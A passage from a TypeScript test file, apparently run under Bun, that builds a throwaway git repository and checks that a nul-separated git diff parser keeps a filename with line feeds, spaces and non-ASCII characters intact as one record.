      expect(third.code).toBe(0); // loud-fail guard NOT tripped by exotic-but-trustworthy records
      expect(third.stdout).toBe(`${NOOP_MESSAGE}\n`);
    } finally {
      await rm(sandbox, { recursive: true, force: true });
    }
  });

  test("LIVE git -z harness: real diff bytes carry an LF/space/non-ASCII filename intact into the nul parser", async () => {
    const sandbox = await mkdtemp(join(tmpdir(), "dev3-v23-znames-"));
    try {
      await gitOk(sandbox, ["init"]);
      await gitOk(sandbox, ["config", "user.email", "ci@example.test"]);
      await gitOk(sandbox, ["config", "user.name", "ci-bench"]);
      await writeFile(join(sandbox, "README.md"), "# base\n");
      await gitOk(sandbox, ["add", "."]);
      await gitOk(sandbox, ["commit", "-m", "base"]);
      await gitOk(sandbox, ["branch", "-M", "main"]);
      await gitOk(sandbox, ["remote", "add", "origin", sandbox]); // so origin/main resolves
      await gitOk(sandbox, ["fetch", "origin"]);

      // Exotic-name change ON TOP of origin/main — exercised with the EXACT
      // production argv shape from buildGitDiffArgv (spawned as one ARGV array,
      // never a shell string): local verification of the `-z` output contract.
      await writeFile(join(sandbox, WEIRD_FILENAME), mdDocument([FENCE, "flowchart TD", "A-->B", "```", ""]));
      await gitOk(sandbox, ["add", "-A", "."]);
      await gitOk(sandbox, ["commit", "-m", "exotic name"]);

      const proc = Bun.spawn(buildGitDiffArgv("main"), {
        cwd: sandbox,
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr, code] = await Promise.all([
        new Response(proc.stdout).text(),
        new Response(proc.stderr).text(),
        proc.exited,
      ]);
      expect(code).toBe(0);
      expect(stderr).toBe("");
      expect(stdout.includes(WEIRD_FILENAME)).toBe(true); // byte-verbatim record, incl. the raw LF

      const changedSet = computeDocsChangedSet(
        stdout,
        path => (path === WEIRD_FILENAME ? `${FENCE}\nflowchart TD\n` : null),
        { input: "nul" }
      );
      expect(changedSet).toStrictEqual([WEIRD_FILENAME]); // ONE record; fence-scan SELECTED, not dropped
    } finally {
      await rm(sandbox, { recursive: true, force: true });
    }
  });
});

/** Absolute path of the real repository root (tests run from anywhere). */
function REPO_ROOT_SANDBOX(): string {
  return join(import.meta.dir, "..", "..");
}
